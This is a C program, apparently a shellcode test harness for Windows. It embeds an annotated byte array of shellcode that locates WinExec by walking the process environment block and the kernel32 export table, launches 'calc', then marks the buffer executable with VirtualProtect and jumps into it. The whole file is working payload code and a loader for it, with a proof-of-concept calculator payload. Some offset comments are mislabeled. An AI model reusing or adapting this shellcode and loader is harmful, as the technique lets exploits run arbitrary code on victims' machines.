# include <stdlib.h>
# include <stdio.h>
# include <string.h>
# include <windows.h>

int main(void)
{
unsigned char shellcode[] = \
        "\x31\xc0"                         // 0x0         xor  eax, eax
        "\x50"                             // 0x2         push eax
        "\x68\x63\x61\x6c\x63"             // 0x3         push 0x636c6163
        "\x54"                             // 0x8         push esp
        "\x59"                             // 0x9         pop  ecx
        "\x50"                             // 0x10        push eax
        "\x40"                             // 0x11        inc  eax
        "\x92"                             // 0x12        xchg eax, edx
        "\x74\x15"                         // 0x13        je   0x24
        "\x51"                             // 0x15        push ecx
        "\x64\x8b\x72\x2f"                 // 0x16        mov  esi, dword ptr fs:[edx + 0x2f]
        "\x8b\x76\x0c"                     // 0x20        mov  esi, dword ptr [esi + 0xc]
        "\x8b\x76\x0c"                     // 0x23        mov  esi, dword ptr [esi + 0xc]
        "\xad"                             // 0x26        lodsdeax, dword ptr [esi]
        "\x8b\x30"                         // 0x27        mov  esi, dword ptr [eax]
        "\x8b\x7e\x18"                     // 0x29        mov  edi, dword ptr [esi + 0x18]
        "\xb2\x50"                         // 0x32        mov  dl, 0x50
        "\xeb\x1a"                         // 0x34        jmp  0x3e
        "\xb2\x60"                         // 0x36        mov  dl, 0x60
        "\x48"                             // 0x38        dec  eax
        "\x29\xd4"                         // 0x39        sub  esp, edx
        "\x65\x48"                         // 0x41        dec  eax
        "\x8b\x32"                         // 0x43        mov  esi, dword ptr [edx]
        "\x48"                             // 0x45        dec  eax
        "\x8b\x76\x18"                     // 0x46        mov  esi, dword ptr [esi + 0x18]
        "\x48"                             // 0x49        dec  eax
        "\x8b\x76\x10"                     // 0x50        mov  esi, dword ptr [esi + 0x10]
        "\x48"                             // 0x53        dec  eax
        "\xad"                             // 0x54        lodsdeax, dword ptr [esi]
        "\x48"                             // 0x55        dec  eax
        "\x8b\x30"                         // 0x56        mov  esi, dword ptr [eax]
        "\x48"                             // 0x58        dec  eax
        "\x8b\x7e\x30"                     // 0x59        mov  edi, dword ptr [esi + 0x30]
        "\x03\x57\x3c"                     // 0x62        add  edx, dword ptr [edi + 0x3c]
        "\x8b\x5c\x17\x28"                 // 0x65        mov  ebx, dword ptr [edi + edx + 0x28]
        "\x8b\x74\x1f\x20"                 // 0x69        mov  esi, dword ptr [edi + ebx + 0x20]
        "\x48"                             // 0x73        dec  eax
        "\x01\xfe"                         // 0x74        add  esi, edi
        "\x8b\x54\x1f\x24"                 // 0x76        mov  edx, dword ptr [edi + ebx + 0x24]
        "\x0f\xb7\x2c\x17"                 // 0x80        movzxebp, word ptr [edi + edx]
        "\x8d\x52\x02"                     // 0x84        lea  edx, [edx + 2]
        "\xad"                             // 0x87        lodsdeax, dword ptr [esi]
        "\x81\x3c\x07\x57\x69\x6e\x45"     // 0x88        cmp  dword ptr [edi + eax], 0x456e6957
        "\x75\xef"                         // 0x95        jne  0x50
        "\x8b\x74\x1f\x1c"                 // 0x97        mov  esi, dword ptr [edi + ebx + 0x1c]
        "\x48"                             // 0x101       dec  eax
        "\x01\xfe"                         // 0x102       add  esi, edi
        "\x8b\x34\xae"                     // 0x104       mov  esi, dword ptr [esi + ebp*4]
        "\x48"                             // 0x107       dec  eax
        "\x01\xf7"                         // 0x108       add  edi, esi
        "\x99"                             // 0x110       cdq
        "\xff\xd7"                         // 0x111       call edi
        "\xff"                             // 0x113       db   0xff
        "\xff"                             // 0x114       db   0xff
        "\xff"                             // 0x115       db   0xff
        "\xff\x00"                         // 0x116       inc  dword ptr [eax]
        "\x00\x00"                         // 0x118       add  byte ptr [eax], al
        "\xff"                             // 0x120       db   0xff
        "\xff"                             // 0x121       db   0xff
        "\xff"                             // 0x122       db   0xff
        "\xff\x00"                         // 0x123       inc  dword ptr [eax]
        "\x00\x00"                         // 0x125       add  byte ptr [eax], al
;

  DWORD run;
  BOOL ret = VirtualProtect (shellcode, strlen(shellcode),
    PAGE_EXECUTE_READWRITE, &run);

  if (!ret) {
    printf ("VirtualProtect\n");
    return EXIT_FAILURE;
  }

  printf("strlen(shellcode)=%d\n", strlen(shellcode));

  system("pause");

  ((void (*)(void))shellcode)();

  return EXIT_SUCCESS;
}
